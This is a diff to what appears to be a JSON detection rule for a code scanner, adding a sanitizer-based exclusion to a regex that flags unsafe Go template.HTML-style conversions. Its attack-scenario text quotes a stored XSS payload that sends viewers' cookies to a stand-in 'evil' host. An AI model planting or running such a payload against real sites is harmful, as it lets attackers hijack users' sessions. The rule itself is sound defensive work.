@@ -20,7 +20,7 @@
     {
       "lang": "go",
       "confidence": "high",
-      "re": "\\btemplate\\.(?:HTML|JS|CSS|URL|HTMLAttr|Srcset|JSStr)\\(\\s*[A-Za-z_]"
+      "re": "\\btemplate\\.(?:HTML|JS|CSS|URL|HTMLAttr|Srcset|JSStr)\\(\\s*[A-Za-z_]", "reject_re": "(?i)sanitize|bluemonday|htmlescape|template\\.HTMLEscape"
     }
   ],
   "attack_scenario": "Attacker stores <script>fetch('//evil/?c='+document.cookie)</script> in their profile bio; because the value was wrapped in template.HTML it is emitted verbatim and runs in every viewer's session, exfiltrating cookies.",
